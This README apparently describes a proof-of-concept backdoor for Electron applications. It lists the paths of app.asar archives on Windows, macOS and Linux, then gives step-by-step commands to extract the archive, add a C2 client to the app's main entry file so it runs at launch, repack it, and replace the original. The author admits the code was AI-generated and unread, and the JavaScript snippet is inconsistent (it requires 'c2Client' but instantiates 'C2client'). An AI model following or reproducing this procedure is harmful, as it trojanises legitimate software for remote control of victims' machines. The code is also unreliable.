# ASAR backdoor PoC (Vibe coding)

## Finding ASAR Files

In most Electron applications, ASAR files are located in these directories:

**Windows:**
```
C:\Users\{Username}\AppData\Local\{AppName}\app.asar
C:\Users\{Username}\AppData\Local\{AppName}\resources\app.asar
C:\Program Files\{AppName}\resources\app.asar
```

**macOS:**
```
/Applications/{AppName}.app/Contents/Resources/app.asar
```

**Linux:**
```
/opt/{AppName}/resources/app.asar
~/.config/{AppName}/resources/app.asar
```

## Extracting and Modifying ASAR Files

1. Install the asar utility:
```bash
npm install -g asar
```

2. Extract the ASAR file:
```bash
asar extract app.asar extracted/
```

3. Integrate the C2 client into the application:

Find the main entry point (often `main.js` or `index.js` in the root directory) and add the C2 client code at the end of the file.

```javascript
// Add this at the end of the main.js or index.js file
const c2Client = require('./c2-client');
let client = new C2client();
client.start();
```

## Repackaging the ASAR File

After modifying the files, repackage the ASAR:

```bash
asar pack extracted/ new-app.asar
```

Then replace the original ASAR file with your modified version.

## NOTE:

This is just a PoC done quickly using A.I, I didn't even read the code so test this in an isolated enviornment and GGs
